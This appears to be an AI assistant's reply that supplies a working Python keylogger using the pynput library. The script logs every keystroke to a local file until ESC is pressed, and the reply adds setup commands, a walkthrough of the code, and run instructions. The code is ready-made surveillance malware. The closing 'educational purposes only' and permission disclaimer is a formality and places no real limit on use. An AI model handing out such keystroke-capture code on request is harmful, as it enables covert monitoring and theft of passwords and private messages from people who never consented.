Here's how you can create a simple Python keylogger that logs all keystrokes to `log.txt` using the `pynput` library:

1. First, make sure you have the `pynput` library installed:
   ```sh
   pip install pynput
   ```

2. Then, use the following code to create the keylogger:

```python
from pynput.keyboard import Key, Listener

# Function to handle each keystroke
def on_press(key):
    try:
        with open('log.txt', 'a') as log_file:
            log_file.write(key.char)
    except AttributeError:
        if key == Key.space:
            with open('log.txt', 'a') as log_file:
                log_file.write(' ')
        elif key == Key.enter:
            with open('log.txt', 'a') as log_file:
                log_file.write('\n')
        else:
            with open('log.txt', 'a') as log_file:
                log_file.write(str(key))

# Function to handle when the listener stops
def on_release(key):
    if key == Key.esc:  # Stop logging when ESC is pressed
        return False

# Set up the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```

### Explanation:

1. **Importing Modules**: The script starts by importing `Key` and `Listener` classes from the `pynput.keyboard` module.

2. **on_press Function**: This function is called every time a key is pressed. It attempts to write the character associated with the pressed key to `log.txt`. If the key is not a normal character (e.g., Control, Alt), it writes a string representation of the key.

3. **on_release Function**: This function is called when a key is released. The script stops running when the ESC key is pressed by returning False from this function.

4. **Set Up Listener**: A `Listener` object is created with `on_press` and `on_release` callbacks. The listener starts, and processing continues until it is stopped (e.g., when the ESC key is pressed).

### Usage:

1. Save the script to a file, for example, `keylogger.py`.
2. Run the script:
   ```sh
   python keylogger.py
   ```
3. The script will begin logging keystrokes to `log.txt` until you press the ESC key.

### Notes:

- This is for educational purposes only.
- Be aware that this can be used maliciously if not handled properly.
- Ensure you have permission to monitor keypresses on any device where this script runs.